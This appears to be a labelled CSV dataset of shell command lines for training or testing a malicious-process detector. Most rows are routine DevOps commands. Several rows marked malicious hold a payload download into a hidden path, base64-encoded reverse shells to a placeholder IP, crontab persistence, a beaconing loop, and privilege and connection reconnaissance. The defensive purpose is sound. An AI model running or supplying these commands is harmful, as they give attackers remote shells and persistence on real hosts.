process_name,command_line,label
pip3,pip3 install -r requirements.txt,benign
kubectl,kubectl logs deploy/nginx --tail 50,benign
bash,"X='curl -fsSL http://198.51.100.198/sh -o /dev/shm/.font-unix/.systemd-private'; eval ""$X""",malicious
python3,python3 -m pytest tests/ -q,benign
grep,grep -r 'TODO' /home/ec2-user/platform/src,benign
ps,ps aux --sort=-%mem | head,benign
free,free -m,benign
kubectl,kubectl rollout status deploy/postgres,benign
systemctl,systemctl restart nginx,benign
npm,npm run build,benign
git,git log --oneline -n 10,benign
bash,echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjE5OC84NDQzIDA+JjE= | base64 -d | bash,malicious
docker,docker logs --tail 100 search,benign
docker,docker build -t nginx:89 .,benign
docker,docker ps -a,benign
uptime,uptime,benign
redis-cli,redis-cli ping,benign
terraform,terraform plan -out tfplan,benign
journalctl,journalctl -u auth-svc --since '10 min ago',benign
grep,grep -r 'TODO' /home/ec2-user/data-pipeline/src,benign
node,node scripts/seed.js,benign
npm,npm test -- --runInBand,benign
git,git pull origin main,benign
apt-get,apt-get install -y nodejs,benign
htop,htop -d 5,benign
bash,echo KGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8gJ0ByZWJvb3QgYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjE5OC84NDQzIDA+JjEnKSB8IGNyb250YWIgLQ== | base64 -d | bash,malicious
journalctl,journalctl -u redis --since '10 min ago',benign
git,git commit -am 'fix: search retry logic',benign
aws,aws s3 ls s3://search-artifacts/,benign
go,go build ./...,benign
df,df -h,benign
systemctl,systemctl status auth-svc,benign
find,find /home/ec2-user/infra -name '*.log' -mtime +7,benign
make,make lint,benign
bash,ls -la /home/ec2-user,benign
journalctl,journalctl -u api-gateway --since '10 min ago',benign
bash,echo bXYgL2Rldi9zaG0vLmZvbnQtdW5peC8uc3lzdGVtZC1wcml2YXRlIC91c3Ivc2Jpbi8uLnN5c3RlbWQtcHJpdmF0ZQ== | base64 -d | bash,malicious
scp,scp report.csv ec2-user@reports:/srv/reports/,benign
find,find /home/ec2-user/web-app -name '*.log' -mtime +7,benign
git,git checkout main,benign
git,git checkout develop,benign
tar,tar czf /backups/auth-svc-66.tgz /var/lib/auth-svc,benign
docker,docker logs --tail 100 worker,benign
kubectl,kubectl logs deploy/api-gateway --tail 50,benign
apt-get,apt-get install -y openjdk-17-jdk,benign
kubectl,kubectl get pods -n production,benign
systemctl,systemctl restart api-gateway,benign
bash,echo d2hpbGUgdHJ1ZTsgZG8gY3VybCAtcyBodHRwOi8vY2RuLWFzc2V0cy02MzkudGVzdC9iOyBzbGVlcCA2MDsgZG9uZSAm | base64 -d | bash,malicious
bash,cd /home/ec2-user/infra && ls,benign
kubectl,kubectl logs deploy/redis --tail 50,benign
npm,npm ci --no-audit,benign
psql,psql -h db -U ec2-user -c 'SELECT count(*) FROM orders;',benign
curl,curl -fsS https://api.github.com/repos/data-pipeline/commits | head,benign
kubectl,kubectl logs deploy/search --tail 50,benign
apt-get,apt-get install -y jq,benign
rsync,rsync -az /home/ec2-user/mobile-api/dist/ /var/www/worker/,benign
journalctl,journalctl -u nginx --since '10 min ago',benign
bash,cd /home/ec2-user/billing-service && ls,benign
curl,curl -s http://localhost:8080/health,benign
journalctl,journalctl -u postgres --since '10 min ago',benign
aws,aws s3 ls s3://redis-artifacts/,benign
bash,echo c3VkbyAtbiAtbCAyPi9kZXYvbnVsbA== | base64 -d | bash,malicious
tar,tar czf /backups/api-gateway-17.tgz /var/lib/api-gateway,benign
systemctl,systemctl restart postgres,benign
docker,docker logs --tail 100 redis,benign
systemctl,systemctl restart redis,benign
git,git checkout release/2.4,benign
bash,"X='ss -tnp 2>/dev/null | head -n 40'; eval ""$X""",malicious
curl,curl -fsS https://api.github.com/repos/billing-service/commits | head,benign
kubectl,kubectl rollout status deploy/payments,benign
ssh,ssh ec2-user@build-56 uptime,benign
docker,docker logs --tail 100 payments,benign
bash,cd /home/ec2-user/platform && ls,benign
docker,docker compose up -d api-gateway,benign
aws,aws s3 ls s3://worker-artifacts/,benign
docker,docker build -t api-gateway:57 .,benign
git,git pull origin hotfix/login,benign
python3,python3 /opt/app/manage.py migrate,benign
git,git pull origin release/2.4,benign
systemctl,systemctl status postgres,benign
find,find /home/ec2-user/data-pipeline -name '*.log' -mtime +7,benign
